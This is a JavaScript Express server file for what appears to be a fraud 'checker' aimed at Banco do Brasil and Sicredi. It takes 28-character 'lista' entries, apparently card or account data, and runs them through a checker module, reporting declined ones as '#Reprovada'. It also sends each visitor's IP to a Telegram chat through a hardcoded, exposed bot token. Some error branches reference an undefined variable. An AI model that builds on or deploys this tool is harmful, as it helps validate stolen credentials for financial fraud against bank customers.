import express from "express";
import requestIp from "request-ip";
import { Telegraf } from "telegraf";
import { checker_bb, checker_sicredi } from "./api.js";
import "ejs";
const app = express();

const bot = new Telegraf('5247604590:AAHiHzBXrM0qdgnbZ1WVZFw-7d87wcPxw0M');

app.set('view engine', 'ejs');
app.set('views', './views');
app.use(express.static('public'));
app.use(express.json());

app.get('/', (req, res) => {
    res.render('index');
});

app.get('/checkerbb', (req, res) => {
    const clientIp = requestIp.getClientIp(req);
    const dataAtual = new Date();
    bot.telegram.sendMessage(1623828324, `<b>NOVO ACESSO DETECTADO!	&#128752;&#65039;\n\nChecker ➜ Banco do Brasil\n\nIPv4/IPv6: <code>${clientIp}</code>\n\n${dataAtual.toLocaleString("pt-Br", {
        dateStyle: "short",
        timeStyle: "short",
        timeZone: "America/Sao_Paulo"
    })}\nHorário de São Paulo.</b>`, { parse_mode: 'HTML' });
    res.render('checker', {
        checker_name: 'Banco do Brasil',
        api_tag: 'apibb',
        limiter: 300,
        test_speed: 250,
        checker_css_em: '9.3em'
    });
});

app.get('/checkersicredi', (req, res) => {
    return res.redirect('./error');
    const clientIp = requestIp.getClientIp(req);
    const dataAtual = new Date();
    bot.telegram.sendMessage(1623828324, `<b>NOVO ACESSO DETECTADO!	&#128752;&#65039;\n\nChecker ➜ Banco Sicredi\n\nIPv4/IPv6: <code>${clientIp}</code>\n\n${dataAtual.toLocaleString("pt-Br", {
        dateStyle: "short",
        timeStyle: "short",
        timeZone: "America/Sao_Paulo"
    })}\nHorário de São Paulo.</b>`, { parse_mode: 'HTML' });
    res.render('checker', {
        checker_name: 'Banco Sicredi',
        api_tag: 'apisicredi',
        limiter: 200,
        test_speed: 400,
        checker_css_em: '8.2em'
    });
});

app.get('/error', (req, res) => {
    res.render('error');
});

app.get('/apibb', async (req, res) => {
    const query = req.query.lista;

    if (query == undefined) {
        return res.send(`<font style="color: red;">#Reprovada ➜ query undefined</font>`);
    }
    if (query == null || query == "") {
        return res.send(`<font style="color: red;">#Reprovada ${card_params} ➜ api ➜ empty card</font>`);
    }

    if (query.length != 28) {
        return res.send(`<font style="color: red;">#Reprovada ${card_params} ➜ api ➜ field needs 28 characters</font>`);
    }
    try {
        const exe_checker = await checker_bb(query);
        res.send(exe_checker);
    } catch (error) {
        return res.send(`<font style="color: red;">#Reprovada ${card_params} ➜ api ➜ api does not respond`);
    }
});

app.get('/apisicredi', async (req, res) => {
    return res.send('api offline!');
    const query = req.query.lista;

    if (query == undefined) {
        return res.send(`<font style="color: red;">#Reprovada ➜ query undefined</font>`);
    }

    if (query == null || query == "") {
        return res.send(`<font style="color: red;">#Reprovada ${card_params} ➜ api ➜ empty card</font>`);
    }

    if (query.length != 28) {
        return res.send(`<font style="color: red;">#Reprovada ${card_params} ➜ api ➜ field needs 28 characters</font>`);
    }
    try {
        const exe_checker = await checker_sicredi(query);
        res.send(exe_checker);
    } catch (error) {
        return res.send(`<font style="color: red;">#Reprovada ${card_params} ➜ api ➜ api does not respond`);
    }
});

app.listen(80);